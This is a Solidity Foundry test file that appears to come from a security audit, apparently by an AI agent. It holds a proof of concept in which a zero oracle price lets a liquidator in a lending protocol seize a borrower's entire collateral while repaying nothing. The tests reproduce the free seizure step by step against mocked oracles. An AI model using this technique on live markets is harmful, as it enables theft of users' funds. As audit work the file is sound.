// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {WAD, ORACLE_PRICE_SCALE} from "../src/libraries/ConstantsLib.sol";
import {Market, CollateralParams} from "../src/interfaces/IMidnight.sol";
import {UtilsLib} from "../src/libraries/UtilsLib.sol";
import {Oracle} from "./helpers/Oracle.sol";
import {ERC20} from "./erc20s/ERC20.sol";
import {BaseTest} from "./BaseTest.sol";
import {stdError} from "../lib/forge-std/src/StdError.sol";

// FINDING (agent-3, economic-security): liquidate's `seizedAssets`-input branch
// values seized collateral at the oracle price WITHOUT guarding against price()==0.
//
//   repaidUnits = seizedAssets.mulDivUp(liquidatedCollatPrice, ORACLE_PRICE_SCALE)
//                            .mulDivUp(WAD, lif);
//
// When liquidatedCollatPrice == 0 this evaluates to 0 for ANY seizedAssets, so a
// liquidator seizes the ENTIRE collateral balance while repaying NOTHING.
//
// The sibling `repaidUnits`-input branch divides BY liquidatedCollatPrice and
// therefore reverts on price()==0 (documented in the LIVENESS section:
// "If the liquidated collateral oracle returns 0 on price, liquidate with repaid
// input reverts."). The asymmetry is the bug: the protocol intends price()==0 to
// block liquidation, but the seizedAssets path silently allows a free seizure.
//
// Realistic trigger (no malicious oracle, no malicious market): an EXPIRED market
// (post-maturity mode needs only block.timestamp > maturity, no health check) whose
// collateral oracle transiently reports 0 (a known external failure mode the
// protocol explicitly handles in the other branch). Any unprivileged caller can
// then steal that collateral from ANY borrower for free.
contract PocFinding07ZeroPriceSeizure is BaseTest {
    using UtilsLib for uint256;

    Market internal market;
    bytes32 internal id;

    // index of the collateral whose oracle we will glitch to 0.
    uint256 internal bIdx;
    // the "healthy" collateral index that keeps the position solvent (so badDebt==0,
    // isolating the free-seizure harm from bad-debt socialization).
    uint256 internal aIdx;

    function setUp() public override {
        super.setUp();
        market.loanToken = address(loanToken);
        market.maturity = vm.getBlockTimestamp() + 100;
        market.collateralParams.push(
            CollateralParams({
                token: address(collateralToken1),
                lltv: 0.86e18,
                maxLif: maxLif(0.86e18, 0.25e18),
                oracle: address(oracle1)
            })
        );
        market.collateralParams.push(
            CollateralParams({
                token: address(collateralToken2),
                lltv: 0.86e18,
                maxLif: maxLif(0.86e18, 0.25e18),
                oracle: address(oracle2)
            })
        );
        market.collateralParams = sortCollateralParams(market.collateralParams);
        market.rcfThreshold = 0;
        id = toId(market);

        // Pick the collateral backed by oracle2 as the one we glitch to 0 (bIdx),
        // and the oracle1-backed one as the solvency-keeping collateral (aIdx).
        bIdx = market.collateralParams[0].oracle == address(oracle2) ? 0 : 1;
        aIdx = 1 - bIdx;
    }

    function _setup(uint256 units, uint256 valuableCollatB) internal {
        // aIdx collateral: enough to keep the debt fully backed (so badDebt == 0).
        collateralize(market, borrower, units, aIdx);

        // bIdx collateral: a real, valuable balance the borrower owns.
        address bToken = market.collateralParams[bIdx].token;
        deal(bToken, borrower, valuableCollatB);
        vm.startPrank(borrower);
        ERC20(bToken).approve(address(midnight), valuableCollatB);
        midnight.supplyCollateral(market, bIdx, valuableCollatB, borrower);
        vm.stopPrank();

        // Create the debt position: borrower sells `units`, lender funds it.
        setupMarket(market, units);
    }

    // POC: post-maturity, bIdx oracle glitches to 0, liquidator seizes ALL of bIdx
    // collateral for ZERO repayment.
    function test_poc_zeroPrice_freeCollateralSeizure() public {
        uint256 units = 100e18;
        uint256 valuableCollatB = 500e18; // real collateral the borrower owns
        _setup(units, valuableCollatB);

        // Market expires.
        vm.warp(market.maturity + 1);

        // bIdx oracle transiently returns 0.
        Oracle(market.collateralParams[bIdx].oracle).setPrice(0);

        uint256 fullB = midnight.collateral(id, borrower, bIdx);
        assertEq(fullB, valuableCollatB, "setup: borrower owns the collateral");

        address bToken = market.collateralParams[bIdx].token;
        uint256 liqLoanBefore = loanToken.balanceOf(liquidator);
        uint256 liqCollatBefore = ERC20(bToken).balanceOf(liquidator);
        uint256 debtBefore = midnight.debtOf(id, borrower);

        // Unprivileged liquidator seizes the FULL collateral balance, repaidUnits input = 0.
        vm.prank(liquidator);
        (uint256 seized, uint256 repaid) =
            midnight.liquidate(market, bIdx, fullB, 0, borrower, true, liquidator, address(0), "");

        // --- The bug: full seizure, zero cost. ---
        assertEq(seized, fullB, "seized the entire collateral");
        assertEq(repaid, 0, "repaidUnits is ZERO");
        assertEq(loanToken.balanceOf(liquidator), liqLoanBefore, "liquidator paid NOTHING in loan token");
        assertEq(
            ERC20(bToken).balanceOf(liquidator) - liqCollatBefore, valuableCollatB, "liquidator received ALL collateral"
        );
        assertEq(midnight.collateral(id, borrower, bIdx), 0, "borrower lost ALL of the collateral");
        // Debt unchanged (no bad debt, because aIdx still backs it) -> pure theft of collateral.
        assertEq(midnight.debtOf(id, borrower), debtBefore, "borrower debt unchanged: collateral stolen for free");
    }

    // POC #2: directly contradicts the protocol's own test
    // `LiquidationTest.testFullBadDebtWithdrawCollateral`, which sets a single
    // collateral's price to 0, realizes bad debt, and asserts the BORROWER can then
    // recover the full collateral via withdrawCollateral (intended behavior).
    // Here, instead, a liquidator atomically realizes the same bad debt AND seizes
    // the entire collateral for repaidUnits=0 in ONE call, before the borrower can
    // withdraw — turning recoverable collateral into a free liquidator windfall.
    function test_poc_singleCollateral_stealsRecoverableCollateral() public {
        // Single-collateral market mirroring testFullBadDebtWithdrawCollateral.
        Market memory m;
        m.loanToken = address(loanToken);
        m.maturity = vm.getBlockTimestamp() + 1000;
        CollateralParams[] memory cp = new CollateralParams[](1);
        cp[0] = CollateralParams({
            token: address(collateralToken1),
            lltv: 0.86e18,
            maxLif: maxLif(0.86e18, 0.25e18),
            oracle: address(oracle1)
        });
        m.collateralParams = cp;
        m.rcfThreshold = 0;
        bytes32 mid = toId(m);

        uint256 units = 100e18;
        collateralize(m, borrower, units);
        setupMarket(m, units);

        uint256 fullCollat = midnight.collateral(mid, borrower, 0);
        assertGt(fullCollat, 0, "borrower has real collateral");

        // Oracle glitches to 0 (the exact condition tested by the protocol).
        Oracle(m.collateralParams[0].oracle).setPrice(0);

        uint256 liqCollatBefore = collateralToken1.balanceOf(liquidator);
        uint256 liqLoanBefore = loanToken.balanceOf(liquidator);

        // Liquidator realizes bad debt AND seizes ALL collateral for free, atomically.
        vm.prank(liquidator);
        (uint256 seized, uint256 repaid) =
            midnight.liquidate(m, 0, fullCollat, 0, borrower, false, liquidator, address(0), "");

        assertEq(repaid, 0, "repaid nothing");
        assertEq(seized, fullCollat, "seized everything");
        assertEq(loanToken.balanceOf(liquidator), liqLoanBefore, "liquidator paid nothing");
        assertEq(collateralToken1.balanceOf(liquidator) - liqCollatBefore, fullCollat, "liquidator took it all");
        // The borrower's collateral that the protocol's own test says they should be
        // able to withdraw is now GONE.
        assertEq(midnight.collateral(mid, borrower, 0), 0, "collateral the borrower should have recovered is stolen");
    }

    // CONTRAST: identical state, but using the repaidUnits-input branch -> REVERTS
    // (division by zero by liquidatedCollatPrice==0). This proves the protocol
    // intends price()==0 to block liquidation, and the seizedAssets branch is the
    // inconsistent path.
    function test_contrast_zeroPrice_repaidInput_reverts() public {
        uint256 units = 100e18;
        uint256 valuableCollatB = 500e18;
        _setup(units, valuableCollatB);

        vm.warp(market.maturity + 1);
        Oracle(market.collateralParams[bIdx].oracle).setPrice(0);

        vm.prank(liquidator);
        vm.expectRevert(stdError.divisionError);
        midnight.liquidate(market, bIdx, 0, 1, borrower, true, liquidator, address(0), "");
    }
}
